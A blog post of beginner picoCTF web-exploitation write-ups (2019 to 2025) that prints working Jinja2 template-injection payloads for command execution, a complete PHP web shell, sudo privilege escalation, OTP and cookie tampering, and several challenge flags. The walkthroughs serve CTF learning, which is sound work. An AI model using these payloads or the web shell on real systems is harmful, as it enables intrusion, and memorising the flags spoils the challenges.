---
layout: post
title: "Easy Challenges"
subtitle: "Burppp.."
date: 2025-05-13 06:11:00 +0530
author: s0c41dgvns 
categories: [PicoCTF, WebExploitation]
tags: [
  web exploitation,
  picoCTF,
    easy challenges,
]
---

# EASY

# PicoCTF 2025

## SSTI1

### Challenge information

![Img](/assets/images/picoEasyImages/image0.png)

Challenge link: [https://play.picoctf.org/practice/challenge/492](https://play.picoctf.org/practice/challenge/492)

### Solution

- Open the site and explore the functionality keeping the title and description in Mind.
- As the title is hinting us with Server-Side template Injection, try injecting the common payloads to test whether it is true or not.

> You can have this _images\image as a mindmap to find what template is being used furtherly.
> 

![Source: [Portswigger](https://portswigger.net/research/server-side-template-injection)](/assets/images/picoEasyImages/image01.png)

Source: [Portswigger](https://portswigger.net/research/server-side-template-injection)

- For a highlevel idea on what is SSTI and how to identify, follow that portswigger guide.
    - Try `${7*7}` → `${7*7}`
    - for `{{7*7}}`  → `49`
    - for `{{7*'7'}}` → `7777777`

So, this confirms that the template that is being used is JINJA2.

Now, check whether we have are getting blocked by 

```python
{{ request.application.__self__._TemplateReference__context.cycler.__init__.__globals__.os.system("id") }}

```

If the output comes, then 

Googled that template specific payloads and found this

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

```html
<!doctype html>
<h1 style="font-size:100px;" align="center">total 12
drwxr-xr-x 2 root root   32 Apr 12 10:09 __pycache__
-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py
-rw-r--r-- 1 root root   58 Mar  6 19:44 **flag**
-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
</h1>
```

later,

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

---

## n0s4n1ty 1

### Challenge information

Challenge link: [https://play.picoctf.org/practice/challenge/482](https://play.picoctf.org/practice/challenge/482)

![_images\image.png](/assets/images/picoEasyImages/image1.png)

### Solution

The home page of the challenge site is like this with a simple file upload feature.

![pico image](/assets/images/picoEasyImages/image2.png)


Try uploading any file but not picture formats like JPG, PNG to check the security implementation of the developer.

- It took that as upload and stored in /uploads/filename format.
- If you go there and see, it just shows the content inside the file.

### Upload a web shell

- From [Revshells.com](https://www.revshells.com/), i have brought a shell of PHP

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>

```

- Now, save this like script.php and upload it in the site and visit that page.
- You will be able to see a input box.

Bang! we have got a reverse shell,

Now execute any linux commands, if we are restricted, we have to look for executable files for Priv-esc. As said in the description of the challenge.

```bash
sudo -l
```

```bash
Matching Defaults entries for www-data on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

This means that we have no restrictions and can use sudo as prefix of normal commands and do our work.

now, list the items in /root

```bash
sudo ls -l /root
```

> Output:
> 
> 
> ```
> total 4
> -rw-r--r-- 1 root root 36 Mar  6 03:56 flag.txt
> ```
> 

now, cat it 

Meow ^^

---

## Head-Dump

### Description

![_images\image.png](/assets/images/picoEasyImages/image3.png)

### Solution

Upon opening the site, there is nothing much but the api-documentation.

On clicking it, it took us to the page. There is a api that souded similar to the title of this challenge, 

`/heapdump` .

Now, send a request or curl that from the terminal.

![_images\image.png](/assets/images/picoEasyImages/image4.png)

I downloaded that file and opened that heapdump file.

In the find section, enter picoCTF and you get the flag in that file.

![_images\image.png](/assets/images/picoEasyImages/image5.png)

---

## Cookie Monster Secret Recipe

### Description

![_images\image.png](/assets/images/picoEasyImages/image6.png)

### Solution

- There is a simple login page, try the default admin:password or lookup for something on the source code.
- when the credentials are entered, it says

![_images\image.png](/assets/images/picoEasyImages/image7.png)

based upon the hint, we may have to look at the cookie, use inspect to get here

![_images\image.png](/assets/images/picoEasyImages/image8.png)

- Now, decode that base64 encoded string that gives you the flag.

---

# PicoCTF2024

## WebDecode

### Description

```
Author: Nana Ama Atombo-Sackey

Description
Do you know how to use the web inspector?
Start searching here to find the flag

Hint1:
Use the web inspector on other files included by the web page.

Hint2:
The flag may or may not be encoded
```

### Solution

- In the about section, try to inspect, there you will see a section like this

```html
   <section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9">
   <h1>
    Try inspecting the page!! You might find it there
   </h1>
   <!-- .about-container -->
  </section>
```

- The value in the Notify_true is actually a base64 encoded value Just decode it and submit.

---

## Unminify

### Description

```html

I don't like scrolling down to read the code of my website, so I've squished it. As a bonus, my pages load faster!
Browse here, and find the flag!

Hint1:
Try CTRL+U / ⌘+U in your browser to view the page source. You can also add 'view-source:' before the URL, or try curl <URL> in your shell.

Hint2:
Minification reduces the size of code, but does not change its functionality.

Hint3:
What tools do developers use when working on a website? Many text editors and browsers include formatting.
```

### Solution

- Try seeing the source page and search for pico and you will get the flag.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>picoCTF - picoGym | Unminify Challenge</title>
    <link rel="icon" type="_images\image/png" sizes="32x32" href="/favicon-32x32.png" />
    <style>
      body{font-family:"Lucida Console",Monaco,monospace}h1,p{color:#000}
    </style>
  </head>
  <body class="picoctf{}" style="margin:0">
    <div
      class="picoctf{}"
      style="margin:0;padding:0;background-color:#757575;display:auto;height:40%"
    >
      <a class="picoctf{}" href="/"
        ><img
          src="picoctf-logo-horizontal-white.svg"
          alt="picoCTF logo"
          style="display:inline-block;width:160px;height:90px;padding-left:30px"
      /></a>
    </div>
    <center>
      <br class="picoctf{}" /><br class="picoctf{}" />
      <div
        class="picoctf{}"
        style="padding-top:30px;border-radius:3%;box-shadow:0 5px 10px #0000004d;width:50%;align-self:center"
      >
        <img
          class="picoctf{}"
          src="hero.svg"
          alt="flag art"
          style="width:150px;height:150px"
        />
        <div class="picoctf{}" style="width:85%">
          <h2 class="picoctf{}">Welcome to my flag distribution website!</h2>
          <div class="picoctf{}" style="width:70%">
            <p class="picoctf{}">
              If you're reading this, your browser has succesfully received the
              flag.
            </p>
            <p class="picoCTF{pr3tty_c0d3_51d374f0}"></p>
            <p class="picoctf{}">
              I just deliver flags, I don't know how to read them...
            </p>
          </div>
        </div>
        <br class="picoctf{}" />
      </div>
    </center>
  </body>
</html>
```

<aside>
⛳ picoCTF{pr3tty_c0d3_51d374f0}

</aside>

---

## IntroToBurp

### Description

```
Description
Try here to find the flag
```

### Solution

The description says not much

- In the homepage, it shows a form, try submitting it and intercepting it with Burp Suite.
- But there is no juicy information, so next they have asked me to enter an OTP which we don’t have
- So, fill in some random and try to submit, it returns with error
- So, again fill the OTP with a random number and this time, intercept that request and remove the OTP parameter from the message section of that Request header.
- This time, after sending it, it returns with OTP. This is called OTP bypass.

---

## Bookmarklet

### Description

### Solution

- You once open the site, you will be given with a function that decrypts the gibberish to our flag, just copy and paste it in the console of the Inspect tool. you will get the flag in Alert box.

![](/assets/images/picoEasyImages/image9.png)

---

# Picoctf2022

## Local Authority

### Description

> Can you get the flag?Go to this [website](http://saturn.picoctf.net:58973/) and see what you can discover.
> 
> 
> ---
> 

### Solution

- Go to the site and check the source code, you will see the filter function, which is of getting an idea but no use, besides there is a  secure.js
- Open that secure.js file and there you will be able to see the uname:password
- Fill the form using those credentials to get the flag.

---

## Inspect HTML

### Description

> Can you get the flag?Go to this [website](http://saturn.picoctf.net:55436/) and see what you can discover.
> 

### Solution

- you can get the flag just by going through the source code.

 

---

## **Includes**

### Description

> Can you get the flag?Go to this
> 
> 
> [website](http://saturn.picoctf.net:51742/)
> 
> and see what you can discover
> 

### Solution

Go through the CSS and JS files and you will get the parts of the flag.

Combine them to submit the flag.

---

## Cookies

### Description

> Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)
> 

### Cookies

- Enter snickedoodle and check the cookies change in the inspector, changes from -1 to 0
- now change that to 1 from 0, you would see a change in the text.
- Likewise, increment the number to get the flag.
- Use this script in terminal to get the flag

```bash
for i in $(seq 1 100); do curl -s --cookie "name=$i"  [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)check; done | grep "picoctf"
```

---

## Scavenger Hunt

### Description

> There is some interesting information hidden around this site [http://mercury.picoctf.net:5080/](http://mercury.picoctf.net:5080/). Can you find it?
> 

### Solution

- Open the site and go to the source code by pressing CTRL + U
- Now, go to js and css files and the main html page, you will find the parts of the flags
- Put them together and submit the flag.

---

## Get aHead

### Description

> Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:15931/](http://mercury.picoctf.net:15931/)
> 

### Solution

- Get the header of the home page, by using the following command

```bash
curl -I http://example.com
```

- This will give you a output containing flag.

---

# PicoCTF 2019

## Don’t Use Client-Side

### Description

### Solution

- Get the source code, this contains a client side password validation.

```jsx
 function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '723c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_7') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'e}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
```

- Get the flag from there.

---

## Logon

### Description

> The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
> 

### Solution

- Go to the site and login with some random credentials.
- You will be logged in. though you won’t be able to see the flag, as it was hidden
- Now, go to cookies and there change the value of `admin` from `False` to `True`

---

## **Insp3ct0r**

### Description

> Kishor Balan tipped us off that the following code may need inspection: `https://jupiter.challenges.picoctf.org/problem/41511/` ([link](https://jupiter.challenges.picoctf.org/problem/41511/)) or http://jupiter.challenges.picoctf.org:41511
> 

### Solution

- Go through the source code and other linked files, you will find the parts of the flag
- Put them together and submit them.

---

## Where are the robots?

### Description

> Can you find the robots? `https://jupiter.challenges.picoctf.org/problem/60915/` ([link](https://jupiter.challenges.picoctf.org/problem/60915/)) or http://jupiter.challenges.picoctf.org:60915
> 

### Solution

- Go to robots.txt, just append to the link.
- There you can be able to see a .html file.
- Now remove the Robots.txt and put that .html file locaiton
- You will get the flag.
